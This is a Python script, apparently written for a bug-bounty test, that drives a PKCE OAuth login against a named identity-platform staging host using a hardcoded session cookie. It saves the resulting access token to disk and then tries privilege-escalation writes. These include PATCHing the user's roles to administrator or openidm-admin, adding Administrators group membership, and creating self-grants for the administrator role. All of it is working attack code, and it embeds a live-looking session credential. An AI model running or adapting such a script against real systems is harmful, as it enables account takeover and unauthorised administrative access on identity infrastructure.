# -*- coding: utf-8 -*-
"""AIC 第十四轮:PKCE 授权码流(完整)+ 新 token 写操作测试
预期结果表:
  成立 -> PKCE 换 token 成功(标准);PATCH 只能改白名单属性
  不成立(发现) -> PATCH 可改受保护属性(roles/admin/manager)或他人资料(IDOR 写)
"""
import requests, urllib3, json, base64, hashlib, os, re
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
COOKIE = 'amlbcookie=01; aa942d46ece12ce=tvVfNxaXuVbrr2BzbooZZTz8iTk.*AAJTSQACMDIAAlNLABxZNXdTYkVsVmxPdWdiRlZkeDc3V3doNTJ1VTg9AAR0eXBlAANDVFMAAlMxAAIwMQ..*'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                  'Cookie': COOKIE})

def pkce_pair():
    ver = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode()
    ch = base64.urlsafe_b64encode(hashlib.sha256(ver.encode()).digest()).rstrip(b'=').decode()
    return ver, ch

def get_token(scope):
    ver, ch = pkce_pair()
    url = (BASE + '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient'
           '&response_type=code&redirect_uri=%s&scope=%s&state=test123'
           '&code_challenge=%s&code_challenge_method=S256' % (RU, scope, ch))
    r = S.get(url, timeout=12, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    if 'code=' not in loc:
        return None, 'no code: ' + loc[:120]
    code = loc.split('code=')[1].split('&')[0]
    r2 = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
                data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                      'client_id': 'endUserUIClient', 'code_verifier': ver},
                timeout=12, verify=False)
    try:
        j = r2.json()
        tok = j.get('access_token')
        if tok:
            p = tok.split('.')[1]
            p += '=' * (-len(p) % 4)
            sc = json.loads(base64.urlsafe_b64decode(p)).get('scope')
            return tok, 'OK scopes=%s' % sc
        return None, 'no token: ' + r2.text[:200]
    except Exception as e:
        return None, 'err: %s %s' % (e, r2.text[:200])

print('=== 1. PKCE 授权码流 ===')
tok, info = get_token('openid fr:iga:*')
print('fr:iga:* ->', info)
if not tok:
    tok, info = get_token('openid fr:idm:*')
    print('fr:idm:* ->', info)
if not tok:
    print('无法获取 token,终止')
    raise SystemExit

# 保存
with open(r'D:\scan\_aic_token.txt', 'w') as f:
    f.write(tok)

S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643', 'Authorization': 'Bearer ' + tok,
                   'Cookie': COOKIE, 'Content-Type': 'application/json'})

def probe(method, path, body=None):
    kw = {}
    if body is not None:
        kw['json'] = body
    try:
        r = S2.request(method, BASE + path, timeout=12, verify=False, **kw)
        print('%-5s %-75s -> %d  %s' % (method, path[:75], r.status_code, r.text[:250].replace('\n', ' ')))
        return r
    except Exception as e:
        print('%-5s %-75s -> ERR %s' % (method, path[:75], str(e)[:60]))

print('\n=== 2. IGA 端点复查(新 token) ===')
probe('GET', '/iga/governance/user/%s/grants?pageSize=10' % MY_ID)
probe('GET', '/iga/governance/user/%s/requests?_pageSize=0' % MY_ID)

print('\n=== 3. 写操作测试 ===')
# PATCH 自己(无害属性)
probe('PATCH', '/iga/governance/user/%s' % MY_ID, {'givenName': 'Qoder'})
# 提权属性
probe('PATCH', '/iga/governance/user/%s' % MY_ID, {'roles': ['administrator']})
probe('PATCH', '/iga/governance/user/%s' % MY_ID, {'memberOf': ['cn=Administrators,ou=groups,o=alpha']})
# IDM 写
probe('PATCH', '/openidm/managed/user/%s' % MY_ID, {'givenName': 'Qoder'})
probe('PATCH', '/openidm/managed/user/%s' % MY_ID, {'roles': ['openidm-admin']})
# grants 写入(请求给自己授权)
probe('POST', '/iga/governance/user/%s/grants' % MY_ID, {'role': 'administrator', 'reason': 'test'})
# requests 创建
probe('POST', '/iga/governance/user/%s/requests' % MY_ID, {'requests': [{'targetType': 'role', 'target': 'administrator'}]})
